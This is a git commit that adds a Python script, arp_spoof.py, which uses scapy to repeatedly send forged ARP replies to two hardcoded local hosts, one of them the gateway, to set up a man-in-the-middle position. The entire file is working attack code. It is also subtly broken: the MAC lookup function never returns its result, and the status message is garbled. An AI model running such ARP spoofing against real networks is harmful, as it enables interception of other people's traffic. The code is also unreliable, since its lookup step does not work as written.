c61ee762e1749973d5a3bf3eaee7856de935bfe4
Marcus Vinicius <58367557+mad-lnx@users.noreply.github.com>
2020-05-18 22:30:49 -0300

    Add files via upload

---
+++ arp_spoof.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+import time
+
+def get_mac_addr(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    #print(answered_list[0][1].hwsrc)
+    
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac_addr(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+        psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+sent_packets_count = 0
+while True:
+    spoof("192.168.1.228", "192.168.1.1")
+    spoof("192.168.1.1", "192.168.1.228")
+    sent_packets_count += 2
+    print("[+] Packets packets: " + str(sent_packets_count))
+    time.sleep(2)
